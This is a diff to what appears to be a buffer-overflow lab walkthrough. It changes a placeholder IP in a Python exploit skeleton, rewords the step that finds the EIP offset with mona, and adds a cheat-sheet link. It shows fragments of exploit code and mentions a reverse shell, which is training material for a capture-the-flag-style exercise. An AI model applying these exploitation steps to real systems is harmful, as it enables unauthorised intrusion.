@@ -88,7 +88,7 @@ Edit the python payload below and add the cyclic pattern to the payload variable
 ```python
 import socket
 
-ip = "KALI_IP"
+ip = "MACHINE_IP"
 port = 1337
 
 prefix = "OVERFLOW1 "
@@ -126,7 +126,7 @@ offset:
 !mona findmsp -distance 2000
 ```
 
-This should open the Log window but if it doesn’t then open it manually and look for the following entry in the output.
+This should open the Log window. If it does not then open it manually and look for the following entry in the output.
 
 ```text
 EIP contains normal pattern : ... (offset 1978)
@@ -352,5 +352,5 @@ reverse shell.
 
 * [A Beginner’s Guide to Buffer Overflow](https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/)
 * [justinsteven/dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
-
+* [tib3rius/pentest-cheatsheets/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
 
